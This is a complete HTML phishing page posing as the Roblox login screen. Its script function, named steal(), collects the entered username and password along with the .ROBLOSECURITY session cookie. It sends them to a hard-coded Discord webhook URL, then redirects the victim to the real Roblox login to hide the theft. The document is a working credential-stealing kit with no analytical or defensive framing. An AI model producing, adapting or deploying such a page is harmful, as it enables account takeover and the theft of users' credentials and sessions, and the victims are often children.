<!DOCTYPE html>
<html>
<head>
<title>Roblox - Log In</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
.box { background: #16213e; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 0 30px rgba(0,0,0,0.8); text-align: center; border: 1px solid #2a3a5e; }
.logo { font-size: 48px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00bfff; }
.logo span { color: #00bfff; }
.tagline { color: #aaa; font-size: 14px; margin: 10px 0 30px 0; letter-spacing: 1px; }
.field { text-align: left; margin: 15px 0; }
.field label { color: #ccc; font-size: 13px; display: block; margin-bottom: 5px; }
.field input { width: 100%; padding: 12px; border: none; border-radius: 4px; background: #0f3460; color: #fff; font-size: 16px; outline: none; }
.field input:focus { border: 2px solid #00bfff; }
.btn { width: 100%; padding: 14px; background: #00bfff; border: none; border-radius: 4px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin: 20px 0 10px; }
.btn:hover { background: #0099cc; }
.signup { color: #888; font-size: 14px; }
.signup a { color: #00bfff; text-decoration: none; }
.signup a:hover { text-decoration: underline; }
</style>
</head>
<body>
<div class="box">
  <div class="logo">RO<span>BLOX</span></div>
  <div class="tagline">SIGN UP AND START HAVING FUN!</div>
  <div class="field">
    <label>Username</label>
    <input type="text" id="username" placeholder="Enter your username">
  </div>
  <div class="field">
    <label>Password</label>
    <input type="password" id="password" placeholder="Enter your password">
  </div>
  <button class="btn" onclick="steal()">Log In</button>
  <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>
</div>
<script>
function steal() {
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || '';
    const data = { username: u, password: p, roblosecurity: cookie };
    fetch('https://discord.com/api/webhooks/1515763157937815644/iBPg1dvthWvVx-TETFB_nbQtSzTQNjcw7jBg9xFJ9hgLFBUY_6klZqGOpFP8_FvSuuUX', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: '```' + JSON.stringify(data, null, 2) + '```' })
    });
    window.location.href = 'https://www.roblox.com/login';
}
</script>
</body>
</html>
